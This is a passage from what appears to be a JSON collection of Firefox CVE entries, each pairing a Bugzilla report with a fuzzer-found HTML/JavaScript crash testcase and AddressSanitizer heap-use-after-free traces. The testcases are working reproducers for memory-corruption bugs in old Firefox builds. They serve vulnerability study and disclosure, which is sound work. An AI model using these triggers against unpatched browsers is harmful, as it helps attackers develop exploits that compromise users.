mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:462:16 #24 0x7ff2afac1782 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:826:9 #25 0x7ff2b1e2e1de in nsDocumentViewer::LoadComplete(nsresult) /builds/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:1064:7 #26 0x7ff2b4ec70f1 in nsDocShell::EndPageLoad(nsIWebProgress*, nsIChannel*, nsresult) /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7779:21 #27 0x7ff2b4ec3114 in nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7577:7 #28 0x7ff2b4eca9af in non-virtual thunk to nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7474:13 #29 0x7ff2ac99b373 in nsDocLoader::DoFireOnStateChange(nsIWebProgress*, nsIRequest*, int&, nsresult) /builds/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:1321:3 #30 0x7ff2ac99a4dc in nsDocLoader::doStopDocumentLoad(nsIRequest*, nsresult) /builds/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:862:14 #31 0x7ff2ac997568 in nsDocLoader::DocLoaderIsEmpty(bool) /builds/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:751:9 #32 0x7ff2ac999482 in nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, nsresult) /builds/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:633:5 #33 0x7ff2ac99a0dc in non-virtual thunk to nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, nsresult) /builds/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:489:14 #34 0x7ff2aaef4400 in mozilla::net::nsLoadGroup::RemoveRequest(nsIRequest*, nsISupports*, nsresult) /builds/worker/workspace/build/src/netwerk/base/nsLoadGroup.cpp:629:28 SUMMARY: AddressSanitizer: heap-use-after-free /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:312:36 in operator! Shadow bytes around the buggy address: 0x0c348000bd10: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c348000bd20: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c348000bd30: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fa 0x0c348000bd40: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c348000bd50: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd =>0x0c348000bd60: fd fd fd fd fd fd fd fd fd fd fd fd fd fd[fd]fd 0x0c348000bd70: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c348000bd80: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c348000bd90: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c348000bda0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c348000bdb0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb ==24229==ABORTING"
      }
    ],
    "CVE-2018-5103": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1423159",
        "title": "heap-use-after-free in mozilla::CreateMouseOrPointerWidgetEvent",
        "description": "The following testcase crashes a release build of Firefox 57.0.2 (SourceStamp=15bb6c3fb5875c7f39aef036dd161df1407b5ee3). It requires the fuzzPriv extension and popups enabled for the page. The cursor needs to be somewhere over the page on loading the testcase. crash.html: <script> function spin () { var x=new XMLHttpRequest(); x.open(\"POST\",\"https://mozilla.org\",false); try{x.send(\"X\");}catch(e){} } function start() { setTimeout(fun0, 500); } function fun0() { o67=document.documentElement.onmouseout=fun1; o123=window.open('div.html','p',''); } function fun1() { o123.close(); spin(); fuzzPriv.GC();fuzzPriv.CC();fuzzPriv.GC();fuzzPriv.CC(); } </script> <body onload=\"start()\"></body> ASAN output: ================================================================= ==21839==ERROR: AddressSanitizer: heap-use-after-free on address 0x60d000278b30 at pc 0x7fdee55652eb bp 0x7ffdf7fefb30 sp 0x7ffdf7fefb28 READ of size 8 at 0x60d000278b30 thread T0 #0 0x7fdee55652ea in nsCOMPtr_base::assign_with_AddRef(nsISupports*) /builds/worker/workspace/build/src/xpcom/base/nsCOMPtr.cpp:42:5 #1 0x7fdee9fc856f in operator= /builds/worker/workspace/build/src/obj-firefox/dist/include/nsCOMPtr.h:967:5 #2 0x7fdee9fc856f in mozilla::CreateMouseOrPointerWidgetEvent(mozilla::WidgetMouseEvent*, mozilla::EventMessage, nsIContent*, nsAutoPtr<mozilla::WidgetMouseEvent>&) /builds/worker/workspace/build/src/dom/events/EventStateManager.cpp:3964 #3 0x7fdee9fc74ed in mozilla::EventStateManager::DispatchMouseOrPointerEvent(mozilla::WidgetMouseEvent*, mozilla::EventMessage, nsIContent*, nsIContent*) /builds/worker/workspace/build/src/dom/events/EventStateManager.cpp:4008:3 #4 0x7fdee9fc9377 in mozilla::EventStateManager::NotifyMouseOut(mozilla::WidgetMouseEvent*, nsIContent*) /builds/worker/workspace/build/src/dom/events/EventStateManager.cpp:4168:3 #5 0x7fdee9fca62f in mozilla::EventStateManager::NotifyMouseOver(mozilla::WidgetMouseEvent*, nsIContent*) /builds/worker/workspace/build/src/dom/events/EventStateManager.cpp:4222:3 #6 0x7fdee9fca54c in mozilla::EventStateManager::NotifyMouseOver(mozilla::WidgetMouseEvent*, nsIContent*) /builds/worker/workspace/build/src/dom/events/EventStateManager.cpp:4203:20 #7 0x7fdee9faa584 in mozilla::EventStateManager::GenerateMouseEnterExit(mozilla::WidgetMouseEvent*) /builds/worker/workspace/build/src/dom/events/EventStateManager.cpp:4342:9 #8 0x7fdee9fa511f in mozilla::EventStateManager::PreHandleEvent(nsPresContext*, mozilla::WidgetEvent*, nsIFrame*, nsIContent*, nsEventStatus*) /builds/worker/workspace/build/src/dom/events/EventStateManager.cpp:732:5 #9 0x7fdeec1aa788 in mozilla::PresShell::HandleEventInternal(mozilla::WidgetEvent*, nsEventStatus*, bool) /builds/worker/workspace/build/src/layout/base/PresShell.cpp:8156:19 #10 0x7fdeec1ac477 in mozilla::PresShell::HandlePositionedEvent(nsIFrame*, mozilla::WidgetGUIEvent*, nsEventStatus*) /builds/worker/workspace/build/src/layout/base/PresShell.cpp:7954:10 #11 0x7fdeec1a77cd in mozilla::PresShell::HandleEvent(nsIFrame*, mozilla::WidgetGUIEvent*, bool, nsEventStatus*, nsIContent**) /builds/worker/workspace/build/src/layout/base/PresShell.cpp:7751:12 #12 0x7fdeeb9a3313 in nsViewManager::DispatchEvent(mozilla::WidgetGUIEvent*, nsView*, nsEventStatus*) /builds/worker/workspace/build/src/view/nsViewManager.cpp:812:14 #13 0x7fdeec1806e6 in mozilla::PresShell::DispatchSynthMouseMove(mozilla::WidgetGUIEvent*, bool) /builds/worker/workspace/build/src/layout/base/PresShell.cpp:3735:33 #14 0x7fdeec194808 in mozilla::PresShell::ProcessSynthMouseMoveEvent(bool) /builds/worker/workspace/build/src/layout/base/PresShell.cpp:5702:12 #15 0x7fdeec1d79a7 in mozilla::PresShell::nsSynthMouseMoveEvent::WillRefresh(mozilla::TimeStamp) /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/PresShell.h:649:16 #16 0x7fdeec0fbf3b in nsRefreshDriver::Tick(long, mozilla::TimeStamp) /builds/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:1886:12 #17 0x7fdeec109f3e in TickDriver /builds/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:337:13 #18 0x7fdeec109f3e in mozilla::RefreshDriverTimer::TickRefreshDrivers(long, mozilla::TimeStamp, nsTArray<RefPtr<nsRefreshDriver> >&) /builds/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:307 #19 0x7fdeec109a56 in mozilla::RefreshDriverTimer::Tick(long, mozilla::TimeStamp) /builds/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:329:5 #20 0x7fdeec10c4cb in RunRefreshDrivers /builds/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:770:5 #21 0x7fdeec10c4cb in mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver::TickRefreshDriver(mozilla::TimeStamp) /builds/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:683 #22 0x7fdeec107827 in mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver::ParentProcessVsyncNotifier::Run() /builds/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:529:20 #23 0x7fdee56dc935 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1039:14 #24 0x7fdee56e209c in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:521:10 #25 0x7fdee645f131 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:97:21 #26 0x7fdee63c387b in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:326:10 #27 0x7fdee63c387b in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:319 #28 0x7fdee63c387b in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:299 #29 0x7fdeeba25daf in nsBaseAppShell::Run() /builds/worker/workspace/build/src/widget/nsBaseAppShell.cpp:158:27 #30 0x7fdeef1125f1 in nsAppStartup::Run() /builds/worker/workspace/build/src/toolkit/components/startup/nsAppStartup.cpp:288:30 #31 0x7fdeef2f186b in XREMain::XRE_mainRun() /builds/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4703:22 #32 0x7fdeef2f3463 in XREMain::XRE_main(int, char**, mozilla::BootstrapConfig const&) /builds/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4867:8 #33 0x7fdeef2f488b in XRE_main(int, char**, mozilla::BootstrapConfig const&) /builds/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4962:21 #34 0x4ebea3 in do_main /builds/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:236:22 #35 0x4ebea3 in main /builds/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:309 #36 0x7fdf0191f2b0 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x202b0) #37 0x41d9f8 in _start (/home/nils/fuzzer3/rel/firefox/firefox+0x41d9f8) 0x60d000278b30 is located 0 bytes inside of 136-byte region [0x60d000278b30,0x60d000278bb8) freed by thread T0 here: #0 0x4bbf2b in __interceptor_free /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:47:3 #1 0x7fdee557b367 in SnowWhiteKiller::~SnowWhiteKiller() /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2704:25 #2 0x7fdee55826bb in FreeSnowWhite /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2892:3 #3 0x7fdee55826bb in nsCycleCollector::BeginCollection(ccType, nsICycleCollectorListener*) /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3909 #4 0x7fdee5581c03 in nsCycleCollector::Collect(ccType, js::SliceBudget&, nsICycleCollectorListener*, bool) /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3730:9 #5 0x7fdee5585950 in nsCycleCollector_collect(nsICycleCollectorListener*) /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:4299:21 #6 0x7fdee826ab6d in nsJSContext::CycleCollectNow(nsICycleCollectorListener*) /builds/worker/workspace/build/src/dom/base/nsJSEnvironment.cpp:1480:3 #7 0x7fdee7dbaa4b in nsDOMWindowUtils::CycleCollect(nsICycleCollectorListener*) /builds/worker/workspace/build/src/dom/base/nsDOMWindowUtils.cpp:1434:3 #8 0x7fdee5703f91 in NS_InvokeByIndex /builds/worker/workspace/build/src/xpcom/reflect/xptcall/md/unix/xptcinvoke_asm_x86_64_unix.S:129 #9 0x7fdee6e0c610 in Invoke /builds/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:1996:12 #10 0x7fdee6e0c610 in Call /builds/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:1315 #11 0x7fdee6e0c610 in XPCWrappedNative::CallMethod(XPCCallContext&, XPCWrappedNative::CallMode) /builds/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:1282 #12 0x7fdee6e139aa in XPC_WN_CallMethod(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNativeJSOps.cpp:929:12 #13 0x7fdeef7d7d64 in CallJSNative /builds/worker/workspace/build/src/js/src/jscntxtinlines.h:293:15 #14 0x7fdeef7d7d64 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:495 #15 0x7fdeef7c1bc6 in CallFromStack /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:546:12 #16 0x7fdeef7c1bc6 in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3084 #17 0x7fdeef7a9117 in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:435:12 #18 0x7fdeef7d7efc in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:513:15 #19 0x7fdeef7d8852 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:559:10 #20 0x7fdef0228a53 in JS_CallFunctionValue(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/jsapi.cpp:2906:12 #21 0x7fdee6d291ab in xpc::FunctionForwarder(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/js/xpconnect/src/ExportHelpers.cpp:315:18 #22 0x7fdeef7d7d64 in CallJSNative /builds/worker/workspace/build/src/js/src/jscntxtinlines.h:293:15 #23 0x7fdeef7d7d64 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:495 #24 0x7fdeef7c1bc6 in CallFromStack /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:546:12 #25 0x7fdeef7c1bc6 in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3084 #26 0x7fdeef7a9117 in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:435:12 #27 0x7fdeef7d7efc in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:513:15 #28 0x7fdeef7d8852 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:559:10 #29 0x7fdef022a8db in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/jsapi.cpp:2965:12 #30 0x7fdee96bc155 in mozilla::dom::EventHandlerNonNull::Call(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/EventHandlerBinding.cpp:260:37 #31 0x7fdeea0825d5 in Call<nsISupports *> /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventHandlerBinding.h:362:12 #32 0x7fdeea0825d5 in mozilla::JSEventHandler::HandleEvent(nsIDOMEvent*) /builds/worker/workspace/build/src/dom/events/JSEventHandler.cpp:215 #33 0x7fdeea04c359 in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, nsIDOMEvent*, mozilla::dom::EventTarget*) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1112:51 #34 0x7fdeea04e430 in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1283:20 #35 0x7fdeea02dc31 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:462:16 #36 0x7fdeea0311d2 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:822:9 #37 0x7fdee9fc7618 in mozilla::EventStateManager::DispatchMouseOrPointerEvent(mozilla::WidgetMouseEvent*, mozilla::EventMessage, nsIContent*, nsIContent*) /builds/worker/workspace/build/src/dom/events/EventStateManager.cpp:4018:3 previously allocated by thread T0 here: #0 0x4bc27c in malloc /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:64:3 #1 0x4ed88d in moz_xmalloc /builds/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:84:17 #2 0x7fdeeb6e15a1 in operator new /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:206:12 #3 0x7fdeeb6e15a1 in NS_NewXULElement(mozilla::dom::Element**, already_AddRefed<mozilla::dom::NodeInfo>&&) /builds/worker/workspace/build/src/dom/xul/nsXULElement.cpp:268 #4 0x7fdee829be60 in NS_NewElement(mozilla::dom::Element**, already_AddRefed<mozilla::dom::NodeInfo>&&, mozilla::dom::FromParser, nsTSubstring<char16_t> const*) /builds/worker/workspace/build/src/dom/base/nsNameSpaceManager.cpp:186:12 #5 0x7fdee816b1d2 in nsDocument::CreateElementNS(nsTSubstring<char16_t> const&, nsTSubstring<char16_t> const&, mozilla::dom::ElementCreationOptionsOrString const&, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/base/nsDocument.cpp:6073:8 #6 0x7fdee96ff73a in mozilla::dom::DocumentBinding::createElementNS(JSContext*, JS::Handle<JSObject*>, nsIDocument*, JSJitMethodCallArgs const&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/DocumentBinding.cpp:1291:59 #7 0x7fdee9c8b1e0 in mozilla::dom::GenericBindingMethod(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:3041:13 #8 0x7fdeef7d7d64 in CallJSNative /builds/worker/workspace/build/src/js/src/jscntxtinlines.h:293:15 #9 0x7fdeef7d7d64 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:495 #10 0x7fdeef7c1bc6 in CallFromStack /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:546:12 #11 0x7fdeef7c1bc6 in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3084 #12 0x7fdeef7a9117 in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:435:12 #13 0x7fdeef7d7efc in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:513:15 #14 0x7fdeef7c1bc6 in CallFromStack /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:546:12 #15 0x7fdeef7c1bc6 in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3084 #16 0x7fdeef7a9117 in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:435:12 #17 0x7fdeef7d7efc in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:513:15 #18 0x7fdeef7c1bc6 in CallFromStack /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:546:12 #19 0x7fdeef7c1bc6 in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3084 #20 0x7fdeef7a9117 in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:435:12 #21 0x7fdeef7d7efc in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:513:15 #22 0x7fdeef7d8852 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:559:10 #23 0x7fdef0228a53 in JS_CallFunctionValue(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/jsapi.cpp:2906:12 #24 0x7fdee6df24a3 in nsXPCWrappedJSClass::CallMethod(nsXPCWrappedJS*, unsigned short, XPTMethodDescriptor const*, nsXPTCMiniVariant*) /builds/worker/workspace/build/src/js/xpconnect/src/XPCWrappedJSClass.cpp:1318:23 #25 0x7fdee570567a in PrepareAndDispatch /builds/worker/workspace/build/src/xpcom/reflect/xptcall/md/unix/xptcstubs_x86_64_linux.cpp:120:28 #26 0x7fdee5704656 in SharedStub (/home/nils/fuzzer3/rel/firefox/libxul.so+0x20c7656) #27 0x7fdeee857ac4 in nsContentTreeOwner::ProvideWindow(mozIDOMWindowProxy*, unsigned int, bool, bool, bool, nsIURI*, nsTSubstring<char16_t> const&, nsTSubstring<char> const&, bool, bool*, mozIDOMWindowProxy**) /builds/worker/workspace/build/src/xpfe/appshell/nsContentTreeOwner.cpp:933:27 #28 0x7fdeef253d8b in nsWindowWatcher::OpenWindowInternal(mozIDOMWindowProxy*, char const*, char const*, char const*, bool, bool, bool, nsIArray*, bool, bool, nsIDocShellLoadInfo*, mozIDOMWindowProxy**) /builds/worker/workspace/build/src/toolkit/components/windowwatcher/nsWindowWatcher.cpp:852:24 #29 0x7fdeef25965f in OpenWindow2 /builds/worker/workspace/build/src/toolkit/components/windowwatcher/nsWindowWatcher.cpp:444:10 #30 0x7fdeef25965f in non-virtual thunk to nsWindowWatcher::OpenWindow2(mozIDOMWindowProxy*, char const*, char const*, char const*, bool, bool, bool, nsISupports*, bool, bool, nsIDocShellLoadInfo*, mozIDOMWindowProxy**) /builds/worker/workspace/build/src/toolkit/components/windowwatcher/nsWindowWatcher.cpp:416 #31 0x7fdee7e5d025 in nsGlobalWindow::OpenInternal(nsTSubstring<char16_t> const&, nsTSubstring<char16_t> const&, nsTSubstring<char16_t> const&, bool, bool, bool, bool, bool, nsIArray*, nsISupports*, nsIDocShellLoadInfo*, bool, nsPIDOMWindowOuter**) /builds/worker/workspace/build/src/dom/base/nsGlobalWindow.cpp:12959:21 #32 0x7fdee7e5b6ff in OpenJS /builds/worker/workspace/build/src/dom/base/nsGlobalWindow.cpp:9013:10 #33 0x7fdee7e5b6ff in nsGlobalWindow::OpenOuter(nsTSubstring<char16_t> const&, nsTSubstring<char16_t> const&, nsTSubstring<char16_t> const&, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/base/nsGlobalWindow.cpp:8975 #34 0x7fdee7e5bb8d in nsGlobalWindow::Open(nsTSubstring<char16_t> const&, nsTSubstring<char16_t> const&, nsTSubstring<char16_t> const&, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/base/nsGlobalWindow.cpp:8984:3 #35 0x7fdee941d948 in mozilla::dom::WindowBinding::open(JSContext*, JS::Handle<JSObject*>, nsGlobalWindow*, JSJitMethodCallArgs const&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/WindowBinding.cpp:2414:56 #36 0x7fdee941bd65 in mozilla::dom::WindowBinding::genericMethod(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/WindowBinding.cpp:15530:13 SUMMARY: AddressSanitizer: heap-use-after-free /builds/worker/workspace/build/src/xpcom/base/nsCOMPtr.cpp:42:5 in nsCOMPtr_base::assign_with_AddRef(nsISupports*) Shadow bytes around the buggy address: 0x0c1a80047110: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd 0x0c1a80047120: fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa 0x0c1a80047130: fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c1a80047140: fd fd fd fa fa fa fa fa fa fa fa fa fd fd fd fd 0x0c1a80047150: fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa =>0x0c1a80047160: fa fa fa fa fa fa[fd]fd fd fd fd fd fd fd fd fd 0x0c1a80047170: fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa 0x0c1a80047180: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c1a80047190: fd fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd 0x0c1a800471a0: fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa 0x0c1a800471b0: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb ==21839==ABORTING"
      }
    ],
    "CVE-2018-5104": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1425000",
        "title": "heap-use-after-free in gfxUserFontEntry::DoLoadNextSrc",
        "description": "The following testcase crashes the latest ASAN build of Firefox nightly (SourceStamp=defccba824aa91e8d4d820b1defaadfdca34bac7). It requires the fuzzPriv extension. <script> function spin () { var x=new XMLHttpRequest(); x.open(\"POST\",\"https://mozilla.org\",false); try{x.send(\"X\");}catch(e){} } function start() { o179=document.cloneNode(true); o585=o179.fonts; o919=new FontFace('font7',\"url('X')\"); o585.add(o919); o585.clear(); spin(); o585=null;o179=null; fuzzPriv.GC();fuzzPriv.CC(); o919.load(); } </script> <body onload=\"start()\"></body> ASAN output: ================================================================= ==18235==ERROR: AddressSanitizer: heap-use-after-free on address 0x608000076920 at pc 0x7f7e6c98867b bp 0x7ffe8ea8fe70 sp 0x7ffe8ea8fe68 READ of size 8 at 0x608000076920 thread T0 (file:// Content) #0 0x7f7e6c98867a in gfxUserFontEntry::DoLoadNextSrc(bool) /builds/worker/workspace/build/src/gfx/thebes/gfxUserFontSet.cpp:560:41 #1 0x7f7e716df45a in DoLoad /builds/worker/workspace/build/src/layout/style/FontFace.cpp:423:19 #2 0x7f7e716df45a in mozilla::dom::FontFace::Load(mozilla::ErrorResult&) /builds/worker/workspace/build/src/layout/style/FontFace.cpp:394 #3 0x7f7e6ec30849 in load /builds/worker/workspace/build/src/obj-firefox/dom/bindings/FontFaceBinding.cpp:1192:45 #4 0x7f7e6ec30849 in mozilla::dom::FontFaceBinding::load_promiseWrapper(JSContext*, JS::Handle<JSObject*>, mozilla::dom::FontFace*, JSJitMethodCallArgs const&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/FontFaceBinding.cpp:1209 #5 0x7f7e6f14f4cf in mozilla::dom::GenericPromiseReturningBindingMethod(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:3088:13 #6 0x7f7e75cf0014 in CallJSNative /builds/worker/workspace/build/src/js/src/jscntxtinlines.h:291:15 #7 0x7f7e75cf0014 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:473 #8 0x7f7e75cd60f6 in CallFromStack /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:528:12 #9 0x7f7e75cd60f6 in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3096 #10 0x7f7e75cc2860 in js::RunScript(JSContext*, 